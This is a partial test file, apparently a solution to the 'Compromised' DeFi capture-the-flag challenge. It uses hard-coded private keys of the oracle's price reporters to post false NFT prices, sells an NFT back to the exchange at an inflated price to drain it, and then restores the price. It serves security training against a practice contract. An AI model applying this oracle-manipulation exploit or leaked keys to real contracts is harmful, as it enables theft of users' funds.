...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        let walletA = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider);
        let walletB = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider);
        console.log(walletA.address, walletB.address);

        // update the price
        await oracle.connect(walletA).postPrice('DVNFT', 0);
        await oracle.connect(walletB).postPrice('DVNFT', 1);
        ...
        // sell at max
        await oracle.connect(walletB).postPrice('DVNFT', balance);
        ...
        await oracle.connect(walletB).postPrice('DVNFT', 2);
        await nftToken.connect(player).approve(exchange.address, 1);
        await exchange.connect(player).sellOne(1);
        console.log(await ethers.provider.getBalance(exchange.address));
        console.log(await ethers.provider.getBalance(player.address));

        await oracle.connect(walletA).postPrice('DVNFT', INITIAL_NFT_PRICE);
        await oracle.connect(walletB).postPrice('DVNFT', INITIAL_NFT_PRICE);
    });
